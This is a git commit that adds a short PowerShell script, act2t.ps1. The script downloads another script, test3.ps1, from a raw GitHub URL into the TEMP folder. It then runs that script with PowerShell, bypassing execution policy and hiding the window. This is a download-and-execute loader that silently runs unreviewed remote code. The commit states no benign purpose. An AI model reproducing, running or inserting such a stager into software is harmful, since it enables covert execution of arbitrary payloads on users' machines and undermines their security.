6fa21b640e56b0b4ef5748ccb3c1680fa064406b
AnatolikFFF <froskintolik@gmail.com>
2026-03-03 17:27:15 +0300

    Create act2t.ps1

---
+++ act2t.ps1
@@ -0,0 +1,8 @@
+$src  = "https://raw.githubusercontent.com/AnatolikFFF/kupikupi_nonono/main/test3.ps1"
+$dest = Join-Path $env:TEMP "test3.ps1"
+
+Invoke-WebRequest -Uri $src -OutFile $dest
+
+Start-Process -FilePath "powershell.exe" `
+  -ArgumentList @("-NoProfile","-ExecutionPolicy","Bypass","-WindowStyle","Hidden","-File",$dest) `
+  -WindowStyle Hidden
